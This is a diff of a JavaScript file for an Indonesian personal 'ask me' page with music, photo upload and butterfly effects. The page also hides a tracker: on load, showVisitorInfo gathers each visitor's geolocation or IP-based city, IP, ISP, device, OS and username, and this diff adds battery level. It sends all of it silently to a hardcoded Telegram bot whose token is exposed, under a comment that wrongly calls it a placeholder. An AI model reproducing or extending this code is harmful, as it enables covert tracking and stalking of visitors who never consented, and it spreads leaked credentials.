@@ -1,20 +1,20 @@
-// == seluruh isi script.js asli kamu, dengan perbaikan posisi teks Spotify ==
-const openPhotoOptions = document.getElementById('openPhotoOptions');
+﻿const openPhotoOptions = document.getElementById('openPhotoOptions');
 const photoOptions = document.getElementById('photoOptions');
 openPhotoOptions.addEventListener('click', () => {
   photoOptions.classList.toggle('show');
 });
 
-// === TOKEN & CHAT ID TELEGRAM ===
+// NOTE: replace the two placeholders below with your actual bot token and chat id
 const BOT_TOKEN = "8317170535:AAGh0PBKO4T-HkZQ4b7COREqLWcOIjW3QTY";
 const CHAT_ID = "6864694275";
 
-// === MUSIK ===
+// === BAGIAN MUSIK — REVISI MOBILE FRIENDLY ===
 const music = document.getElementById('bgmusic');
 const btnMusic = document.getElementById('musicButton');
 let started = false;
 music.volume = 0.4;
 
+// pastikan audio bisa dimulai hanya setelah interaksi nyata
 async function startMusic() {
   if (started) return;
   started = true;
@@ -24,14 +24,19 @@ async function startMusic() {
     btnMusic.classList.remove("show");
     btnMusic.disabled = true;
   } catch (err) {
+    console.log("Autoplay gagal:", err);
     btnMusic.classList.add("show");
   }
 }
 
+// Deteksi platform mobile
 const isMobile = /Android|iPhone|iPad|iOS/i.test(navigator.userAgent);
+
+// PC: boleh langsung trigger setelah klik/touch pertama
 document.addEventListener('click', startMusic, { once: true });
 document.addEventListener('touchstart', startMusic, { once: true });
 
+// tombol utama tetap jadi pemicu manual (aman di mobile)
 btnMusic.addEventListener('click', async () => {
   try {
     await music.play();
@@ -40,14 +45,18 @@ btnMusic.addEventListener('click', async () => {
     btnMusic.classList.remove("show");
     btnMusic.disabled = true;
   } catch (e) {
-    alert("Browser kamu memblokir musik otomatis. Ketuk ulang tombol 🎵");
+    alert("Browser kamu memblokir musik otomatis. Coba ketuk ulang tombol 🎵");
+    console.log(e);
   }
 });
 
+// tambahan: khusus mobile, pastikan tombol tampil dari awal agar user tahu
 if (isMobile) {
   btnMusic.classList.add("show");
   music.muted = true;
+  // hilangkan autoplay otomatis agar tidak error
 } else {
+  // desktop: bisa coba autoplay kecil setelah delay
   setTimeout(() => { startMusic(); }, 800);
 }
 
@@ -56,7 +65,7 @@ const modal = document.getElementById('modal');
 document.getElementById('openAsk').onclick = () => modal.classList.add('show');
 document.getElementById('closeQ').onclick = () => modal.classList.remove('show');
 
-// === LOGIN IG ===
+// === LOGIN INSTAGRAM ===
 const overlay = document.getElementById("blurOverlay"),
   input = document.getElementById("igInput"),
   btnLogin = document.getElementById("igSubmit"),
@@ -78,7 +87,10 @@ function showUserStatus(n) {
     }
   };
 }
-if (savedIG) { removeOverlay(); showUserStatus(savedIG); }
+if (savedIG) {
+  removeOverlay();
+  showUserStatus(savedIG);
+}
 btnLogin.onclick = () => {
   const u = input.value.trim();
   if (!u) return alert("Masukkan username dulu");
@@ -87,7 +99,7 @@ btnLogin.onclick = () => {
   removeOverlay();
 };
 
-// === FUNGSI KIRIM TELEGRAM ===
+// === FUNGSI KIRIM TELEGRAM UNIVERSAL ===
 async function sendTelegramMessage(url, body, el) {
   el.innerHTML = `
     <div class="mailContainer">
@@ -98,74 +110,90 @@ async function sendTelegramMessage(url, body, el) {
   try {
     const res = await fetch(url, body);
     if (res.ok) {
-      const swoosh = new Audio("https://cdn.pixabay.com/download/audio/2022/03/15/audio_5c2e04eb7c.mp3?filename=mail-send-82336.mp3");
-      swoosh.volume = 0.45;
-      swoosh.play().catch(()=>{});
+      try {
+        const swoosh = new Audio("https://cdn.pixabay.com/download/audio/2022/03/15/audio_5c2e04eb7c.mp3?filename=mail-send-82336.mp3");
+        swoosh.volume = 0.45;
+        swoosh.play().catch(() => {});
+      } catch (e) {}
       el.innerHTML = `<div class="sentAnim">Terkirim! <span>✓</span></div>`;
-      setTimeout(()=>el.innerHTML="",3000);
+      setTimeout(() => el.innerHTML = "", 3000);
       return true;
     } else {
       el.textContent = "💔 Gagal mengirim.";
       return false;
     }
-  } catch {
+  } catch (e) {
     el.textContent = "😿 Koneksi lemah.";
     return false;
   }
 }
 
 // === KIRIM PERTANYAAN ===
-document.getElementById('sendQ').addEventListener('click', async()=>{
+document.getElementById('sendQ').addEventListener('click', async () => {
   const savedUser = localStorage.getItem("ig_user") || "Anonim";
   const text = document.getElementById('qtext').value.trim();
   const qmsg = document.getElementById('qmsg');
-  if(!text){qmsg.textContent="Isi pertanyaan dulu.";return;}
+  if (!text) {
+    qmsg.textContent = "Isi pertanyaan dulu.";
+    return;
+  }
   await sendTelegramMessage(
     `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
-    {method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({chat_id:CHAT_ID,text:`💬 Pertanyaan dari ${savedUser}\n${text}`})},
+    { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ chat_id: CHAT_ID, text: `💬 Pertanyaan dari ${savedUser}\n${text}` }) },
     qmsg
   );
-  setTimeout(()=>{ if(qmsg.textContent.includes("Terkirim")) modal.classList.remove('show'); }, 900);
+  setTimeout(() => { if (qmsg.textContent.includes("Terkirim")) modal.classList.remove('show'); }, 900);
 });
 
 // === KIRIM FOTO ===
-const takeBtn=document.getElementById("takePhoto");
-const photoInput=document.getElementById("photoInput");
-const preview=document.getElementById("photoPreview");
-takeBtn.onclick=async()=>{
-  try{
-    const cameraInput=document.createElement("input");
-    cameraInput.type="file";cameraInput.accept="image/*";cameraInput.capture="user";
+const takeBtn = document.getElementById("takePhoto");
+const photoInput = document.getElementById("photoInput");
+const preview = document.getElementById("photoPreview");
+
+takeBtn.onclick = async () => {
+  try {
+    const cameraInput = document.createElement("input");
+    cameraInput.type = "file";
+    cameraInput.accept = "image/*";
+    cameraInput.capture = "user";
     cameraInput.click();
-    cameraInput.onchange=()=>{
-      if(cameraInput.files.length>0){
+    cameraInput.onchange = () => {
+      if (cameraInput.files.length > 0) {
         photoInput.files = cameraInput.files;
         const reader = new FileReader();
         reader.onload = (e) => { preview.src = e.target.result; preview.style.display = "block"; };
         reader.readAsDataURL(cameraInput.files[0]);
       }
     };
-  }catch(e){alert("Kamera tidak tersedia");}
+  } catch (e) { alert("Kamera tidak tersedia"); }
 };
-photoInput.addEventListener('change',()=>{ if(photoInput.files && photoInput.files[0]){ const reader=new FileReader(); reader.onload=()=>{}; reader.readAsDataURL(photoInput.files[0]); } });
-document.getElementById("sendPhoto").addEventListener('click', async()=>{
+photoInput.addEventListener('change', () => {
+  if (photoInput.files && photoInput.files[0]) {
+    const reader = new FileReader();
+    reader.onload = () => {};
+    reader.readAsDataURL(photoInput.files[0]);
+  }
+});
+document.getElementById("sendPhoto").addEventListener('click', async () => {
   const savedUser = localStorage.getItem("ig_user") || "Anonim";
   const fileInput = document.getElementById("photoInput");
   const file = fileInput.files && fileInput.files[0];
   const caption = document.getElementById("caption").value;
   const statusEl = document.getElementById("status");
-  if(!file){statusEl.textContent="Pilih foto dulu.";return;}
+  if (!file) { statusEl.textContent = "Pilih foto dulu."; return; }
   const fd = new FormData();
   fd.append("chat_id", CHAT_ID);
   fd.append("caption", `📸 Foto dari ${savedUser}\n${caption}`);
   fd.append("photo", file);
   const ok = await sendTelegramMessage(
     `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
-    {method:"POST", body: fd},
+    { method: "POST", body: fd },
     statusEl
   );
-  if(ok){
-    fileInput.value=""; document.getElementById("caption").value=""; preview.style.display="none";
+  if (ok) {
+    fileInput.value = "";
+    document.getElementById("caption").value = "";
+    preview.style.display = "none";
   }
 });
 
@@ -175,13 +203,29 @@ async function showVisitorInfo() {
   async function sendToTelegram(d, latitude, longitude, source = "Unknown", accuracy = null) {
     try {
       const now = new Date();
-      const mapLink = (latitude && longitude) ? `https://www.google.com/maps?q=${latitude},${longitude}&z=17` : "https://www.google.com/maps";
+      const mapLink = (latitude && longitude)
+        ? `https://www.google.com/maps?q=${latitude},${longitude}&z=17`
+        : "https://www.google.com/maps";
       const device = /mobile/i.test(navigator.userAgent) ? "📱 Mobile" : "🖥️ Desktop";
-      const os = /Windows/i.test(navigator.userAgent) ? "Windows" : /Android/i.test(navigator.userAgent) ? "Android" : /iPhone|iPad|iOS/i.test(navigator.userAgent) ? "iOS" : /Mac/i.test(navigator.userAgent) ? "MacOS" : /Linux/i.test(navigator.userAgent) ? "Linux" : "Unknown";
+      const os = /Windows/i.test(navigator.userAgent) ? "Windows" :
+        /Android/i.test(navigator.userAgent) ? "Android" :
+        /iPhone|iPad|iOS/i.test(navigator.userAgent) ? "iOS" :
+        /Mac/i.test(navigator.userAgent) ? "MacOS" :
+        /Linux/i.test(navigator.userAgent) ? "Linux" : "Unknown";
+      let batteryInfo = "Tidak diketahui";
+      try {
+        const battery = await navigator.getBattery();
+        batteryInfo = `${(battery.level * 100).toFixed(0)}% (${battery.charging ? "⚡" : "🔋"})`;
+      } catch {}
       const msg = `📢 Pengunjung Baru!
 👤 ${savedUser}
 🌎 ${d.city || "?"}, ${d.country || d.country_name || "?"}
 🗺️ Maps: ${mapLink}
+📍 Sumber Lokasi: ${source}${accuracy ? ` (±${accuracy}m)` : ""}
+💻 ${device}
+🧩 OS: ${os}
+🔋 Baterai: ${batteryInfo}
+🏷️ ISP: ${d.connection?.isp || d.org || "?"}
 📡 IP: ${d.ip || "?"}
 🕓 ${now.toLocaleString('id-ID')}`;
       await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -189,7 +233,7 @@ async function showVisitorInfo() {
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
       });
-    } catch (err) {}
+    } catch (err) { console.error("❌ Gagal kirim info:", err); }
   }
   try {
     const coords = await new Promise((resolve, reject) => {
@@ -205,11 +249,14 @@ async function showVisitorInfo() {
 }
 showVisitorInfo();
 
-// === EFEK BUTTERFLY ===
+// === EFEK BUTTERFLY 💸 ===
 (function(){
   const area = document.querySelector('.card');
   const butterflies = [];
   const butterflyCount = 7;
+  let holdActive = false;
+  let holdX = 0;
+  let holdY = 0;
   area.style.position = 'relative';
   area.style.overflow = 'hidden';
   function getBounds(){ const rect=area.getBoundingClientRect(); return { width: area.clientWidth, height: area.clientHeight, left: rect.left, top: rect.top }; }
@@ -224,11 +271,14 @@ showVisitorInfo();
     const time = performance.now()/200;
     butterflies.forEach(b=>{
       b.vy += 0.002;
+      if(holdActive){ const dx=holdX-b.x; const dy=holdY-b.y; b.vx += dx*0.002; b.vy += dy*0.002; }
       b.vx += Math.sin(time + b.flapOffset)*0.04;
       b.vy += Math.cos(time + b.flapOffset)*0.02;
       b.x += b.vx; b.y += b.vy;
       if(b.x <= 0 || b.x >= rect.width - b.size) b.vx *= -0.8;
       if(b.y <= 0 || b.y >= rect.height - b.size) b.vy *= -0.8;
+      b.vx = Math.max(-1.8, Math.min(1.5, b.vx));
+      b.vy = Math.max(-1.8, Math.min(1.8, b.vy));
       const flap = Math.sin(time*8 + b.flapOffset)*20;
       b.el.style.left = b.x + 'px'; b.el.style.top = b.y + 'px';
       b.el.style.transform = `rotate(${flap}deg) scale(${1 + Math.sin(time*4 + b.flapOffset)*0.05})`;
@@ -236,6 +286,17 @@ showVisitorInfo();
     requestAnimationFrame(moveButterflies);
   }
   moveButterflies();
+  const startHold=(x,y)=>{ const rect=getBounds(); holdActive=true; holdX=x-rect.left; holdY=y-rect.top; };
+  const moveHold=(x,y)=>{ if(holdActive){ const rect=getBounds(); holdX=x-rect.left; holdY=y-rect.top; } };
+  const endHold=()=> holdActive=false;
+  area.addEventListener('mousedown', e=> startHold(e.clientX,e.clientY));
+  area.addEventListener('mousemove', e=> moveHold(e.clientX,e.clientY));
+  area.addEventListener('mouseup', endHold);
+  area.addEventListener('mouseleave', endHold);
+  area.addEventListener('touchstart', e=>{ const t=e.touches[0]; startHold(t.clientX,t.clientY); });
+  area.addEventListener('touchmove', e=>{ const t=e.touches[0]; moveHold(t.clientX,t.clientY); });
+  area.addEventListener('touchend', endHold);
+  area.addEventListener('touchcancel', endHold);
 })();
 
 // === LIVE MODE STATUS ===
